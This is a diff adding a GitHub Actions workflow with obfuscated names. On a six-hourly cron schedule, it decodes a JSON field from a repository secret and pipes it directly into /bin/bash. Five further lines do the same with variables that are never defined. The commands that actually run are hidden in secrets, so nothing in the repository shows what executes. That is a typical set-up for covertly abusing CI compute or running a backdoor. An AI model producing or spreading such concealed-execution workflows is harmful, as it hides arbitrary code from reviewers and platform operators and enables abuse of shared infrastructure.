@@ -1,0 +1,24 @@
+name: huangjiao2314
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '59 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: huangjiao2314
+        env:
+          imut2314: ${{ secrets.imut2314 }}
+        run: |
+          echo $imut2314 | jq -r .a0 | /bin/bash
+          echo $t95477 | jq -r .v17469 | /bin/bash
+          echo $ten0133 | jq -r .wigy87341 | /bin/bash
+          echo $fmrsr46752 | jq -r .g97405 | /bin/bash
+          echo $kz77507 | jq -r .rwg7175 | /bin/bash
+          echo $wwfvu9690 | jq -r .biyxb5061 | /bin/bash
+
